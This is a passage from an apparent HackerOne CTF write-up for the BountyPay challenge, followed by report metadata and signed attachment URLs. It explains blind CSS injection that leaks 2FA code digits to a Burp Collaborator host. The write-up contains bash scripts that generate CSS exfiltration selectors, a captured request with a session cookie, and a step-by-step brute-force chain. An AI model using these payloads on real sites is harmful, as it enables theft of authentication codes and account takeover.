first.\n{F861251}\nWhen clicking on `Pay` this site gets displayed:\n{F861241}\nWhen clicking `Send Challenge` this request gets made:\n```\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 73\nCache-Control: max-age=0\nOrigin: https://app.bountypay.h1ctf.com\nUpgrade-Insecure-Requests: 1\nDNT: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nAccept-Encoding: gzip, deflate\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\nWeird. Why is a css file getting sent? I fired up a collaborator and used it as the value for the `app_style` variable to see what I was dealing with here.\n{F861244}\nNothing out of the ordinary. In addition if I give a url with valid css it isnt used in the response I recieved. Is this a blind server side css injection?\nGoogle has the answers. To be more percise, [d0nut](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) has the answers. In his article he talks about CSS injection and how an attacker would be able to exfiltrate CSRF tokens and such. To test if overall CSS injection would be possible, I created a simple payload. \n```css\nhtml{\n\tbackground-image: url(https://94b2tg0vwhkehih0chniro0plgr6fv.burpcollaborator.net/this/works);\n}\n```\nEvery html page has the `html` tag. So if the CSS was getting used somewhere, the background-image had to be loaded.\n{F861249}\nBoom. Now I kind of knew what I had to do. In the blogpost d0nut talked about bruteforcing variables and their names. So I tried that next. There were rules for the wordlist. Since I was gonna be bruteforcing every character, each line of the wordlist needed to be one character. The characters in my wordlist ranged from A-Z, a-z, 1-9 and a special character. \n\n[Final wordlist](https://www.hecht1.com/wordlist_css.txt)\n\nNow that I had my wordlist I was able to create the css bruteforce file. Again I used bash do this for me automatically.\n```bash\n#!/bin/bash\nwhile read p; do\necho \"input[name^=$2$p] ~ * {\"\necho \"background-image: url(https://$1/exfil/$p);\"\necho \"}\"\ndone < wordlist| tee /var/www/html/exploit.css                                                                                                                                                                           \n```\nUsage: \n```bash\n./createcss.sh yourcollaborator.burpcollaborator.net [letters you already bruteforced]\n```\nExample:\n```bash\n./createcss.sh 8qzpkamy7iz4wv55tgwpj6myapgg45.burpcollaborator.net\n```\n[Output](https://www.hecht1.com/example_exploit.css)\nThis created a css file which set the burp collaborator payload as the background image and automatically saved the file in my web root. This background image got requested when the input field started with the letter in the wordlist. The letter that fired is included in the image request as a directory. When the server loads the css, it should send us the first letter of every input fields variable name. \n{F861245}\nAnd it works! Because I recieved an HTTP request, I now knew that there was an input field that started with c. \nThe next command would be:\n```bash\n./createcss.sh 8qzpkamy7iz4wv55tgwpj6myapgg45.burpcollaborator.net c \n```\nThe c at the end gets added to the css selector\nThis is the first class of the new css file\n```css\ninput[name^=ca] ~ * {\nbackground-image: url(https://8qzpkamy7iz4wv55tgwpj6myapgg45.burpcollaborator.net/exfil/a);\n}\n```\nNow the classes worked like this: Give every input field that starts with a c and continues with [wordlist letter] that background image.\n{F861246}\nAnd it fired again! So now I knew that there was an input field with the name `co...`\nAfter repeating these steps a couple of times I hit a dead end. I had 6 HTTP requests sitting in my collaborator.\n{F861248}\nI recieved a request for `/exfil/1` - `/exfil/6`!\nSo there are 6 variables that I know of.\n\n - code_1\n - code_2\n - code_3\n - code_4\n - code_5\n - code_6\n\nSince the `maxlength` in the html is set to seven, I figured that each variable represents one character of the 2FA challenge.\nI bruteforced the values of these variables with the same technique as before. I created two bash scripts to help me.\nThe first one created the bruteforce classes for a given code number\n```bash\n#!/bin/bash\nwhile read p;\ndo\necho \"input[name=code_$2][value^=$p] ~ * {\"\necho \"background-image: url(https://$1/exfil/$2/$p);\" \ndone < wordlist | tee /var/www/html/exploit$2.css \n```\nAnd the second one automatically created bruteforce classes for every code number and merged them into one file, so that I could bruteforce every code variable at once with one request. The final css file is called `finalexploit.css`.\n```bash\n#!/bin/bash\nrm /var/www/html/finalexploit.css\ntouch /var/www/html/finalexploit.css\nfor i in 1 2 3 4 5 6\ndo\n./valuebruteforce.sh $1 $i >> /var/www/html/finalexploit.css\ndone\n```\nExample: `./auto.sh 39ar9wxu5r7c67709uopn8unkeq4et.burpcollaborator.net `\nOutput: [Example](https://www.hecht1.com/exampleexploit.css)\nWhen loading the final css payload, the following requests got into my collaborator\n{F861247}\nI got 6 http requests. One for each `code_x` variable. Each `code_x` variable sends a request with it its `x` number and the content of the variable in the directory.\nE.g.: `/exfil/x/[letter]`\nIn the example above I recieved a request from `code_1`. The content of `code_1` is F. I know this from the directory it requested.\n\nThrough this method I got 6 of the 7 characters required to authenticate.\nBut why isnt there a `code_7`? Since the `maxlength` attribute in the html is set to 7 there should be a `code_7` as well right? This was not that big of a problem afterall. The last character I bruteforced through HTTP with Burp Intruder. The same wordlist was applied. \n### Final exploit chain\n1. Get a collaborator url\n2. Paste the collaborator url in the bash script\n`./auto.sh xyz.burpcollaborator.net`\n3. Point the `app_style` to the url of the `finalexploit.css`  file\n4. Pray that all 6 values pop up in the collaborator. It was pretty inconsistent\n{F861259}\n5. Catch the `Send Answer` request with the Burp Proxy\n6. Send to Intruder\n7. Clear all `§§`\n8. Paste the 6 values in their correct order into the `challenge_answer` field.\n9. Add `§§` to the end of the `challenge_answer` variable\nThe variables should look somewhat like this: `challenge_timeout=1591704498&challenge=f45685e51eeac99db8fedce9f4648ee4&challenge_answer=SHlIxB§§` \n10. Select the correct wordlist \n11. Start the attack \n\nAfter I did these steps I sorted the Intruder responses by size and got the final value.\n{F861254}\n## CTF Completed! \nThank you for this awesome CTF! I definetly enjoyed it a lot and learned many new things. Thanks to [@adamtlangley](https://twitter.com/adamtlangley) and [@B3nac](https://twitter.com/B3nac) for creating this CTF and [@hackerone](https://twitter.com/Hacker0x01) for making everything happen! \nFor me the hardest parts were definetly the Android part and the final 2FA bypass. I didnt even know that bruteforcing values through CSS was a thing before!\n\nIt was an awesome challenge.\n",
            "automated_response": false,
            "created_at": "2020-06-09T21:48:06.000Z",
            "updated_at": "2020-06-09T21:48:06.000Z",
            "actor": {
                "username": "counterbreach",
                "cleared": false,
                "verified": false,
                "url": "/counterbreach",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/Vx5BUBb6Aafcet2ejiib45JS/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "attachments": [
                {
                    "id": 861260,
                    "filename": "softwarestorage.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rP2XqpdsZhd2kCyx21r4aAAL?response-content-disposition=attachment%3B%20filename%3D%22softwarestorage.jpg%22%3B%20filename%2A%3DUTF-8%27%27softwarestorage.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13a622b69583bdf10976979056bc9e55616f926262621d0320243406d36da254"
                },
                {
                    "id": 861259,
                    "filename": "praytothecssgods.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Rm8yFocJiZDqZQLQaMoj65Er?response-content-disposition=attachment%3B%20filename%3D%22praytothecssgods.jpg%22%3B%20filename%2A%3DUTF-8%27%27praytothecssgods.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5c70d612a344d46da726e9ee5e13ee5ca7ca32ca0d182337a80edf872d51d5d0"
                },
                {
                    "id": 861258,
                    "filename": "parttwo_2.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LTLvdEzevaXy8Cdf72enhFgB?response-content-disposition=attachment%3B%20filename%3D%22parttwo_2.jpg%22%3B%20filename%2A%3DUTF-8%27%27parttwo_2.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=25b3b213b9f037a2d3ef90b71d224b53f15b4866409d8c0f1fd4cd68a46e3aa5"
                },
                {
                    "id": 861257,
                    "filename": "parttwo.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4Ydr79qjCJgJyhrGaxAV13KH?response-content-disposition=attachment%3B%20filename%3D%22parttwo.jpg%22%3B%20filename%2A%3DUTF-8%27%27parttwo.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=79909ac0517f15152e4a07b8cfd4f664c260608ad1b8fa310d4c2b8b460c7b24"
                },
                {
                    "id": 861256,
                    "filename": "partthree.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YFP3ZrT9XQEVtKdawGdeidYJ?response-content-disposition=attachment%3B%20filename%3D%22partthree.jpg%22%3B%20filename%2A%3DUTF-8%27%27partthree.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=56e1dd0782190c5fff6b68552664df17a1019dc3345f0a856e94c9c45f744287"
                },
                {
                    "id": 861255,
                    "filename": "partone.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HJY6Bce29jfRV6j8jttTzDyE?response-content-disposition=attachment%3B%20filename%3D%22partone.jpg%22%3B%20filename%2A%3DUTF-8%27%27partone.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=71adda04bbab0edd26adad641a360fe59fb46089a4f6425b8eeca7b3e40cd784"
                },
                {
                    "id": 861254,
                    "filename": "intruder.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/swmS59PWCm8hJdy7q9i1Fx76?response-content-disposition=attachment%3B%20filename%3D%22intruder.jpg%22%3B%20filename%2A%3DUTF-8%27%27intruder.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5Ssltuayl